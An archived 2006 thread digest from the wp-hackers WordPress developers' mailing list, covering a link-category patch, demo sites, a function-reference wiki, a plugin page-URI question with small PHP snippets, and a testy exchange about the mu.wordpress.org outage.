From shane.p.brady at gmail.com  Sun Apr  2 00:22:24 2006
From: shane.p.brady at gmail.com (Shane Brady)
Date: Sun Apr  2 00:25:48 2006
Subject: [wp-hackers] Link Subcategories
Message-ID: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>

I've made some changes that will allow you to have true separate link
categories for Wordpress 2.0.  I'm including a small file with the tiny
schema changes and the diff.  I hope someone finds this useful.

http://www.shanebrady.com/files/wp2.0LinkSubCat.tgz

Regards,

Shane P Brady
From mani.monajjemi at gmail.com  Mon Apr  3 11:41:58 2006
From: mani.monajjemi at gmail.com (Mani Monajjemi)
Date: Mon Apr  3 11:45:26 2006
Subject: [wp-hackers] "Wordpress Admin Demo" Demo
Message-ID: <d4d3e29e0604030441y52f4d030sa08150ea4bee82c4@mail.gmail.com>

I've just set-up a wordpress demo site for showing new users the wordpress
admin panel. I hacked wordpress a bit to be sure that the demo user can not
change anything I described the way here:
http://wordpress.org/support/topic/41434?replies=6#post-316461

you can login through username:demo and password:demo.

I think this must be an add-on to wordpress.org, but for now , is it worth
announing? If so I would change the frontpage a bit to introduce wordpress
and some of its unique features.

Please mention that this demo does not need any hourly clean up at all!
--
Mani Monajjemi
www.manionline.org
From podz at tamba2.org.uk  Mon Apr  3 12:28:06 2006
From: podz at tamba2.org.uk (Podz)
Date: Mon Apr  3 12:31:40 2006
Subject: [wp-hackers] "Wordpress Admin Demo" Demo
In-Reply-To: <d4d3e29e0604030441y52f4d030sa08150ea4bee82c4@mail.gmail.com>
References: <d4d3e29e0604030441y52f4d030sa08150ea4bee82c4@mail.gmail.com>
Message-ID: <443114D6.3060601@tamba2.org.uk>

Mani Monajjemi wrote:
> I've just set-up a wordpress demo site for showing new users the wordpress
> admin panel. I hacked wordpress a bit to be sure that the demo user can not
> change anything I described the way here:
http://wordpress.org/support/topic/41434?replies=6#post-316461

I've pointed people here for some time:
http://www.tamba2.org.uk/wordpress/TestTrack/ though for different 
reasons. No hacking - just a few files deleted. I left it on Admin login 
for ages and no-one tried anything odd.

P.
From mike at zed1.com  Mon Apr  3 12:35:50 2006
From: mike at zed1.com (Mike Little)
Date: Mon Apr  3 12:39:17 2006
Subject: [wp-hackers] "Wordpress Admin Demo" Demo
In-Reply-To: <443114D6.3060601@tamba2.org.uk>
References: <d4d3e29e0604030441y52f4d030sa08150ea4bee82c4@mail.gmail.com>
	<443114D6.3060601@tamba2.org.uk>
Message-ID: <7235ce780604030535w3683b69v3e790ee578606020@mail.gmail.com>

On 4/3/06, Podz <podz@tamba2.org.uk> wrote:
> Mani Monajjemi wrote:
> > I've just set-up a wordpress demo site for showing new users the wordpress
> > admin panel.

As Skippy pointed out in the forum entry, why is this any better than
the Wordpress demo set up at OpenSourceCMS.com?
http://www.opensourcecms.com/index.php?option=content&task=view&id=2143&Itemid=159

   1. The demo of this system is a default installation.
   2. Some admin features may have been disabled for security reasons.
   3. The entire system is deleted and reinstalled every two hours.


Mike
--
Mike Little
http://zed1.com/
From ringmaster at midnightcircus.com  Mon Apr  3 16:07:42 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Mon Apr  3 16:07:53 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <6453a6e90603301926w72541336m1ce114f002e0e031@mail.gmail.com>
References: <001901c6539f$e6a498d0$6a00a8c0@FAMILYROOM>	<DA357452-BF28-446D-96F2-A94173DFD3B5@alexking.org>	<80f75db0603301612qe686ee2qf32ad88929b2196b@mail.gmail.com>	<a491f91d0603301758i763f53c2ke2c34489908341b5@mail.gmail.com>
	<6453a6e90603301926w72541336m1ce114f002e0e031@mail.gmail.com>
Message-ID: <4431484E.4010701@midnightcircus.com>

Andrew Krespanis wrote:
> Nothing new to add, other than +1 for inline docs.
> I'll happily volunteer to contribute to inline docs and have made an
> account at Owen's existing function reference[1] (though I am unable
> to find a way of editing existing entries...)

For the edification of anyone interested, since I had yet to make this 
project truly public:

I created a developer function reference for functions in WordPress. 
This function reference is located here:

http://redalt.com/fn/

You can access most WP functions by tacking the function name onto the 
base URL, similar to the php.net function reference:

http://redalt.com/fn/the_content

WP files can be referenced similarly:

http://redalt.com/fn/file/functions.php

Only users who are logged in can modify entries.  MicroWiki handles the 
logins at RedAlt, which unifies the logins for the Plugin Version 
Service, the function reference, and the wiki.

You can log in or register a new login pretty easily:

http://redalt.com/wiki/DoLogin

The required email address (for sending out the initial password) is 
just a quick barrier against spammers.  I don't have any intention of 
even looking at the email addresses.

Assuming you've created a login, you should be able to log in to the 
wiki from any function reference page by clicking the small [log in] 
link at the bottom of the page.

After you're logged in, view one of the function reference page.  Click 
on the thing you want to edit.  Edit it.  Easy.

Each item that gets a description usually has 2 description fields. 
Only the short (first) description is used when generating the PHPDoc at 
the bottom of the page.  I have copied some of the Codex documentation 
(the examples, usually) into the detailed field, but not much.

Currently, all plugin hook names are linked to MarkJ's hook directory. 
Also, WP functions in the source link to their reference pages.  I would 
consider generating other types of links if they're useful, like linking 
native PHP functions to their php.net reference.

The function list in the database is updated twice per day by running my 
update script against a fresh svn update of WP's trunk.  The only thing 
that really throws it off is when a function moves to a different file 
(like functions in the new deprecated.php file), in which case more than 
one function might be listed under the same name in the database.  It's 
not as easy to detect these changes as you might think, so for the time 
being, both copies remain referenced.  That makes it possible to copy 
the old documentation to the new function location.  I should make a way 
to mark one instance for deletion after its data has been transferred.

In any case, you can directly reference any function by a unique number 
assigned by the system.  If you poke around the reference site, you'll 
notice this, especially with functions in the importers, which are all 
named the same, but exist in different files.

I currently get email updates when the reference changes via edits and 
via svn updates.  This might be useful for a general mailing list, but 
I'll have to clean it up a bit if the public wants to consume it.

Assuming the system is adopted, my future plans include generating a 
unified diff of the PHPDoc comments that merges cleanly into the SVN 
from which the data is generated.  That way, you would be able to 
download a clean copy of the WP source, patch the latest comments in, 
and then use your favorite PHPDoc-aware editor without having to hit 
RedAlt for the docs.  Of course, the patch would only include the short 
descriptions, but the @link PHPDoc directive should take you directly to 
the complete function reference at RedAlt.

Upon a WP release, we should be able to create an archive of the current 
docs that you could patch into that version.

I'll happily consider any suggestions.  Adding a commenting feature is 
probably not a bad idea, as long as the comments are more oriented 
toward using the functions, and not asking questions about them.  It 
should be more like the php.net function reference, and so comments will 
likely have to be heavily moderated.

Thoughts?

Owen

From podz at tamba2.org.uk  Tue Apr  4 16:28:23 2006
From: podz at tamba2.org.uk (Podz)
Date: Tue Apr  4 16:31:53 2006
Subject: [wp-hackers] Forum post: mysql
In-Reply-To: <4431484E.4010701@midnightcircus.com>
References: <001901c6539f$e6a498d0$6a00a8c0@FAMILYROOM>	<DA357452-BF28-446D-96F2-A94173DFD3B5@alexking.org>	<80f75db0603301612qe686ee2qf32ad88929b2196b@mail.gmail.com>	<a491f91d0603301758i763f53c2ke2c34489908341b5@mail.gmail.com>	<6453a6e90603301926w72541336m1ce114f002e0e031@mail.gmail.com>
	<4431484E.4010701@midnightcircus.com>
Message-ID: <44329EA7.7060302@tamba2.org.uk>

http://wordpress.org/support/topic/67719?replies=1

Reports too much mysql usage - info listed here:
http://pastebin.com/640174

P.
From m at mullenweg.com  Tue Apr  4 18:04:29 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Apr  4 18:07:58 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <4431484E.4010701@midnightcircus.com>
References: <001901c6539f$e6a498d0$6a00a8c0@FAMILYROOM>	<DA357452-BF28-446D-96F2-A94173DFD3B5@alexking.org>	<80f75db0603301612qe686ee2qf32ad88929b2196b@mail.gmail.com>	<a491f91d0603301758i763f53c2ke2c34489908341b5@mail.gmail.com>	<6453a6e90603301926w72541336m1ce114f002e0e031@mail.gmail.com>
	<4431484E.4010701@midnightcircus.com>
Message-ID: <4432B52D.2070704@mullenweg.com>

Owen Winkler wrote:
> I created a developer function reference for functions in WordPress. 
> This function reference is located here:

I like this a lot. Nice work.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From m at mullenweg.com  Tue Apr  4 18:07:57 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Tue Apr  4 18:11:23 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
Message-ID: <4432B5FD.6070608@mullenweg.com>

Shane Brady wrote:
> I've made some changes that will allow you to have true separate link
> categories for Wordpress 2.0.  I'm including a small file with the tiny
> schema changes and the diff.  I hope someone finds this useful.
> 
> http://www.shanebrady.com/files/wp2.0LinkSubCat.tgz

This is highly unlikely to be included, given the changes already in the 
trunk and the combining of the category and link category system. I 
would recommend checking out the latest unstable code and giving it a 
whirl to see if it addresses your needs, and it if not consider sending 
a patch to our bug tracker here:

http://trac.wordpress.org/

Which is where patches and bugs are reviewed and included.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From amanzimtoti at gmail.com  Wed Apr  5 00:17:41 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Wed Apr  5 00:21:15 2006
Subject: [wp-hackers] MU Wordpress?
Message-ID: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>

I know this probably isn't the right place for this question, but I
was wondering if anyone knew when the mu.wordpress.org site will be
back up and running. Apparently the site was moving servers last week,
but the forums are still down - even though they "should be back
tomorrow" (it's been saying this since last week!) :-)

Cheers - Stuart
From shane.p.brady at gmail.com  Wed Apr  5 01:11:56 2006
From: shane.p.brady at gmail.com (Shane Brady)
Date: Wed Apr  5 01:15:24 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <4432B5FD.6070608@mullenweg.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
Message-ID: <62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>

I did check it out, and I didn't like the idea of categories being shared.
I realize from #wordpress that my approach is the opposite of the current
codebase direction.  And that's fine, from discussions on #wordpress, I
thought some people might find it useful.  About 50 people have downloaded
it so far, so at least a few people are interested. :)

On 4/4/06, Matt Mullenweg <m@mullenweg.com> wrote:
>
> Shane Brady wrote:
> > I've made some changes that will allow you to have true separate link
> > categories for Wordpress 2.0.  I'm including a small file with the tiny
> > schema changes and the diff.  I hope someone finds this useful.
> >
> > http://www.shanebrady.com/files/wp2.0LinkSubCat.tgz
>
> This is highly unlikely to be included, given the changes already in the
> trunk and the combining of the category and link category system. I
> would recommend checking out the latest unstable code and giving it a
> whirl to see if it addresses your needs, and it if not consider sending
> a patch to our bug tracker here:
>
> http://trac.wordpress.org/
>
> Which is where patches and bugs are reviewed and included.
>
> --
> Matt Mullenweg
>   http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From m at mullenweg.com  Wed Apr  5 07:18:22 2006
From: m at mullenweg.com (Matt Mullenweg)
Date: Wed Apr  5 07:21:49 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
Message-ID: <44336F3E.7050002@mullenweg.com>

Stuart wrote:
> I know this probably isn't the right place for this question, but I
> was wondering if anyone knew when the mu.wordpress.org site will be
> back up and running. Apparently the site was moving servers last week,
> but the forums are still down - even though they "should be back
> tomorrow" (it's been saying this since last week!) :-)

For some value of tomorrow.

-- 
Matt Mullenweg
  http://photomatt.net | http://wordpress.org
http://automattic.com | http://akismet.com
From amanzimtoti at gmail.com  Wed Apr  5 11:31:00 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Wed Apr  5 11:34:30 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <44336F3E.7050002@mullenweg.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
Message-ID: <d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>

Err - OK... thanks?

Does anyone else know what the situation is with MU??


On 4/5/06, Matt Mullenweg <m@mullenweg.com> wrote:
> Stuart wrote:
> > I know this probably isn't the right place for this question, but I
> > was wondering if anyone knew when the mu.wordpress.org site will be
> > back up and running. Apparently the site was moving servers last week,
> > but the forums are still down - even though they "should be back
> > tomorrow" (it's been saying this since last week!) :-)
>
> For some value of tomorrow.
>
> --
> Matt Mullenweg
>   http://photomatt.net | http://wordpress.org
> http://automattic.com | http://akismet.com
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From false.hopes at gmail.com  Wed Apr  5 11:35:53 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr  5 11:39:20 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
Message-ID: <a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>

On 4/5/06, Stuart <amanzimtoti@gmail.com> wrote:
> Err - OK... thanks?
>
> Does anyone else know what the situation is with MU??

You just got an e-mail from the man himself, the founder of WP, the
guy who is in charge of all the servers, etc. It is doubtful that
anyone else will know anything regarding getting a wp.org site up and
running.

--
--Robert Deaton
http://somethingunpredictable.com
From amanzimtoti at gmail.com  Wed Apr  5 11:41:54 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Wed Apr  5 11:45:23 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
Message-ID: <d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>

Yeah - I know who Matt is... just hoping to get a better response from
someone else - "For some value of tomorrow." didn't seem to make sense
to me..??


On 4/5/06, Robert Deaton <false.hopes@gmail.com> wrote:
> On 4/5/06, Stuart <amanzimtoti@gmail.com> wrote:
> > Err - OK... thanks?
> >
> > Does anyone else know what the situation is with MU??
>
> You just got an e-mail from the man himself, the founder of WP, the
> guy who is in charge of all the servers, etc. It is doubtful that
> anyone else will know anything regarding getting a wp.org site up and
> running.
>
> --
> --Robert Deaton
> http://somethingunpredictable.com
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
>
>
From peter.westwood at ftwr.co.uk  Wed Apr  5 12:56:59 2006
From: peter.westwood at ftwr.co.uk (Peter Westwood)
Date: Wed Apr  5 13:00:30 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
Message-ID: <42648.199.64.72.252.1144241819.squirrel@epia.ftwr.co.uk>


On Wed, April 5, 2006 12:41 pm, Stuart wrote:
> Yeah - I know who Matt is... just hoping to get a better response from
> someone else - "For some value of tomorrow." didn't seem to make sense
> to me..??
>

Maybe "ma?ana" fits better:
   1. Tomorrow.
   2. At an unspecified future time.

I think what Matt means is it will be back when its back when he has the
time to finish the migration of mu.wordpress.org to the new server

westi
-- 
Peter Westwood <peter.westwood@ftwr.co.uk>
http://blog.ftwr.co.uk
From villiageidiot at gmail.com  Wed Apr  5 14:18:41 2006
From: villiageidiot at gmail.com (Dave Pappas)
Date: Wed Apr  5 14:22:12 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <42648.199.64.72.252.1144241819.squirrel@epia.ftwr.co.uk>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<42648.199.64.72.252.1144241819.squirrel@epia.ftwr.co.uk>
Message-ID: <21cf363b0604050718y6e5e0388wd9eb983ef900a1b2@mail.gmail.com>

Tomorrow = April 5, 2006

On 4/5/06, Peter Westwood <peter.westwood@ftwr.co.uk> wrote:
>
>
> On Wed, April 5, 2006 12:41 pm, Stuart wrote:
> > Yeah - I know who Matt is... just hoping to get a better response from
> > someone else - "For some value of tomorrow." didn't seem to make sense
> > to me..??
> >
>
> Maybe "ma?ana" fits better:
>   1. Tomorrow.
>   2. At an unspecified future time.
>
> I think what Matt means is it will be back when its back when he has the
> time to finish the migration of mu.wordpress.org to the new server
>
> westi
> --
> Peter Westwood <peter.westwood@ftwr.co.uk>
> http://blog.ftwr.co.uk
> _______________________________________________
> wp-hackers mailing list
> wp-hackers@lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>
From david at coppit.org  Wed Apr  5 18:23:52 2006
From: david at coppit.org (David Coppit)
Date: Wed Apr  5 18:27:34 2006
Subject: [wp-hackers] "This page" inconsistency
Message-ID: <Pine.BSF.4.64.0604051416050.27661@www.provisio.net>

For management pages of plugins, it's sufficient to give the filename
without a directory:

   /blog/wp-admin/edit.php?page=category-order-management.php&action=blah

(category-order-management.php is in plugins/category_order)

But for options pages, you need to give the directory as well:

   /blog/wp-admin/options-general.php?page=category-access/category-access-options.php

If you don't you get an error.


The former can be gotten using this in the plugin:

   $_SERVER['PHP_SELF'] . "?page=" . basename(__FILE__);

Whereas you need this for the latter:

   $page_only_uri = $_SERVER["REQUEST_URI"];
   $page_only_uri = preg_replace('/&.*/','',$page_only_uri);


Questions: Is the first non-directory method a feature or a bug? Is this
inconsistency a feature or a bug? Is there a "correct" way of getting the
current page?

Thanks,
David

_____________________________________________________________________
David Coppit                           david@coppit.org
The College of William and Mary        http://coppit.org/

"... frothy eloquence neither convinces nor satisfies me."
-- 1899, Willard D. Vandiver (D-MO)
From ringmaster at midnightcircus.com  Wed Apr  5 18:32:35 2006
From: ringmaster at midnightcircus.com (Owen Winkler)
Date: Wed Apr  5 18:33:03 2006
Subject: [wp-hackers] "This page" inconsistency
In-Reply-To: <Pine.BSF.4.64.0604051416050.27661@www.provisio.net>
References: <Pine.BSF.4.64.0604051416050.27661@www.provisio.net>
Message-ID: <44340D43.5010308@midnightcircus.com>

David Coppit wrote:
> Questions: Is the first non-directory method a feature or a bug? Is this
> inconsistency a feature or a bug? Is there a "correct" way of getting the
> current page?

The implementation seems to change depending on the status of fixing 
bugs filed in Trac, but...

If you use plugin_basename(__FILE__) instead of basename(__FILE__) you 
should get the plugin file and the directory, if it is being used.

To demonstrate using some of your code:

$_SERVER['PHP_SELF'] . "?page=" . plugin_basename(__FILE__)

Does every server/config provide PHP_SELF?  It might be better to use 
get_settings('home') . '/wp-admin/{actual_page_name_here}'

Owen



From false.hopes at gmail.com  Wed Apr  5 19:26:11 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr  5 19:29:42 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
Message-ID: <a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>

On 4/5/06, Stuart <amanzimtoti@gmail.com> wrote:
> Yeah - I know who Matt is... just hoping to get a better response from
> someone else - "For some value of tomorrow." didn't seem to make sense
> to me..??

Tomorrow's value is constantly changing. Today is April 5, and today
tomorrow is April 6th, but on April 6th tomorrow is April 7th, so
really tomorrow has an infinite number of possible values. His point
is, at some point, it will be fixed, but not necessarily by April 6th,
just at some point in the future.

--
--Robert Deaton
http://somethingunpredictable.com
From david at coppit.org  Wed Apr  5 19:37:08 2006
From: david at coppit.org (David Coppit)
Date: Wed Apr  5 19:40:43 2006
Subject: [wp-hackers] Re: "This page" inconsistency
In-Reply-To: <44340D43.5010308@midnightcircus.com>
References: <Pine.BSF.4.64.0604051416050.27661@www.provisio.net>
	<44340D43.5010308@midnightcircus.com>
Message-ID: <Pine.BSF.4.64.0604051534440.45489@www.provisio.net>

On Wed, 5 Apr 2006, Owen Winkler wrote:

> To demonstrate using some of your code:
>
> $_SERVER['PHP_SELF'] . "?page=" . plugin_basename(__FILE__)
>
> Does every server/config provide PHP_SELF?  It might be better to use 
> get_settings('home') . '/wp-admin/{actual_page_name_here}'

Odd. I tried this:

   $page_uri = $_SERVER['PHP_SELF'] . "?page=" . plugin_basename(__FILE__);

and got this error:

   PHP Fatal error:  Cannot redeclare class category_order_management

but this works:

   $page_uri = $_SERVER['PHP_SELF'] . "?page=" . basename(__FILE__);

Is this my fault? Do I need to guard my class with
"if (!class_exists(...))"?

David

_____________________________________________________________________
David Coppit                           david@coppit.org
The College of William and Mary        http://coppit.org/

"... frothy eloquence neither convinces nor satisfies me."
-- 1899, Willard D. Vandiver (D-MO)
From chris.lott at gmail.com  Wed Apr  5 20:56:56 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Apr  5 21:00:29 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
Message-ID: <9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>

On 4/5/06, Robert Deaton <false.hopes@gmail.com> wrote:
>His point
> is, at some point, it will be fixed, but not necessarily by April 6th,
> just at some point in the future.

A point which didn't need to be made (clearly it will be back someday)
and whose smug and sarcastic uselesness in response to a valid
question characterizes a lot of what turns people off when they
encounter the WP community. Imagine getting that answer to a question
that was important to YOU?

There are at least a half-dozen professional, useful answers that
ought to come to mind before what was given. After all, presumably
"the man himself" was at least aware of-- if not responsible for-- the
fact that a specific date was given and an implied promise
unfulfilled, giving rise to the obvious and polite question.

c
From chris.lott at gmail.com  Wed Apr  5 20:58:48 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Apr  5 21:02:16 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
Message-ID: <9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>

On 4/4/06, Shane Brady <shane.p.brady@gmail.com> wrote:
> at least a few people are interested. :)

I, for one, appreciate it. Combining the categorization schemes is a
step backwards in my opinion.

c
From chris.lott at gmail.com  Wed Apr  5 21:01:17 2006
From: chris.lott at gmail.com (Chris Lott)
Date: Wed Apr  5 21:04:45 2006
Subject: [wp-hackers] Inline documentation
In-Reply-To: <4431484E.4010701@midnightcircus.com>
References: <001901c6539f$e6a498d0$6a00a8c0@FAMILYROOM>
	<DA357452-BF28-446D-96F2-A94173DFD3B5@alexking.org>
	<80f75db0603301612qe686ee2qf32ad88929b2196b@mail.gmail.com>
	<a491f91d0603301758i763f53c2ke2c34489908341b5@mail.gmail.com>
	<6453a6e90603301926w72541336m1ce114f002e0e031@mail.gmail.com>
	<4431484E.4010701@midnightcircus.com>
Message-ID: <9b1b9dab0604051401u22402e24x83b9bf366aac0199@mail.gmail.com>

On 4/3/06, Owen Winkler <ringmaster@midnightcircus.com> wrote:
> I created a developer function reference for functions in WordPress.
> This function reference is located here:
>
> http://redalt.com/fn/

Very handy...

c
From false.hopes at gmail.com  Wed Apr  5 21:12:52 2006
From: false.hopes at gmail.com (Robert Deaton)
Date: Wed Apr  5 21:16:21 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
	<9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
Message-ID: <a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>

On 4/5/06, Chris Lott <chris.lott@gmail.com> wrote:
> A point which didn't need to be made (clearly it will be back someday)

It obviously did need to be made, otherwise there wouldn't have been a
reponse saying:

> "For some value of tomorrow." didn't seem to make sense
> to me..??

> and whose smug and sarcastic uselesness in response to a valid
> question characterizes a lot of what turns people off when they
> encounter the WP community. Imagine getting that answer to a question
> that was important to YOU?

If I didn't understand, and someone explained it to me, I wouldn't be
quite as pissed as this mail, I'd be happy that someone stepped aside
and took the time to explain something. Your anger seems to stem from
something else, if you're pissed about the way the community is, open
another thread, don't go on about it to a perfectly fine response
here.

>
> There are at least a half-dozen professional, useful answers that
> ought to come to mind before what was given. After all, presumably
> "the man himself" was at least aware of-- if not responsible for-- the
> fact that a specific date was given and an implied promise
> unfulfilled, giving rise to the obvious and polite question.

And the question was answered in a not rude and sarcastic way. I
explained what was meant by "for some value of tomorrow." Where that
comes off as sarcastic, I still fail to see, but as there wasn't a
response as I skimmed the replies that explained this in a clear,
concise way, I explained it.

Perhaps your anger is slightly misdirected, it wasn't my choice that
its not fixed today, I simply explained what Matt meant in his
original response. I'm sorry my response wasn't outlined in hearts
with a wonderful "I'm so sorry its not fixed even though I have
nothing to do with the fact that its broken" apology note attached at
the top.


--
--Robert Deaton
http://somethingunpredictable.com
From nuclearmoose at gmail.com  Wed Apr  5 21:45:30 2006
From: nuclearmoose at gmail.com (Craig)
Date: Wed Apr  5 21:49:00 2006
Subject: [wp-hackers] Link Subcategories
In-Reply-To: <9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
References: <62cad8e0604011622n4e6fb692xec5b07f7a14c1fe8@mail.gmail.com>
	<4432B5FD.6070608@mullenweg.com>
	<62cad8e0604041811q54e00ebu39acc7c226ca3a53@mail.gmail.com>
	<9b1b9dab0604051358n6b0ad122yabc77b086dd21a1c@mail.gmail.com>
Message-ID: <5aa3aa0604051445y75bbbac2y1c8f1b34eccac5aa@mail.gmail.com>

I was discussing this in #wordpress earlier today. It seems that part of the
rationale is in making the code that much simpler, and the other is to move
WP away from categories and essentially having a tag system which offers a
lot more flexibility.

I don't claim to know this to be the truth or 100% correct, but that is what
I got out of the talk. On my own blog, I've never conceived of bookmark
categories and post categories to be shared in any way. That's just how my
mindset works; perhaps this new way will offer me some advantages that I
don't yet understand.

Regardless, I'm reserving judgement on this until I understand better the
pros and cons of the changes. For now, it simply makes my list of categories
a lot longer and I have to be a bit more diligent to select the correct
category (tag?).

Craig.
From amanzimtoti at gmail.com  Wed Apr  5 22:36:59 2006
From: amanzimtoti at gmail.com (Stuart)
Date: Wed Apr  5 22:40:29 2006
Subject: [wp-hackers] MU Wordpress?
In-Reply-To: <a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>
References: <d21a6860604041717m6709702aub3724d89833eb378@mail.gmail.com>
	<44336F3E.7050002@mullenweg.com>
	<d21a6860604050431s575e5b8bn6c8a58b5988ac283@mail.gmail.com>
	<a491f91d0604050435n5ddf46e2g1775c96997068473@mail.gmail.com>
	<d21a6860604050441v30eebb8o71ce32dc7658a26f@mail.gmail.com>
	<a491f91d0604051226u422375f1ka0338f1d06525087@mail.gmail.com>
	<9b1b9dab0604051356j7506a57fxaac7d5dcb3d974e7@mail.gmail.com>
	<a491f91d0604051412g2ecc8b76o3b76005582008b73@mail.gmail.com>
Message-ID: <d21a6860604051536v20e1ef5eq8a40aac75adb29ce@mail.gmail.com>

Thanks for sticking up for me Chris. I took Matt's response as a
brush-off which is why I asked if someone else knew. To me it was a
sensible question and I was hoping for a sensible response.
And I still don't know when it will be back...

On 4/6/06, Robert Deaton <false.hopes@gmail.com> wrote:
> On 4/5/06, Chris Lott <chris.lott@gmail.com> wrote:
> > A point which didn't need to be made (clearly it will be back someday)
>
> It obviously did need to be made, otherwise there wouldn't have been a
> reponse saying:
>
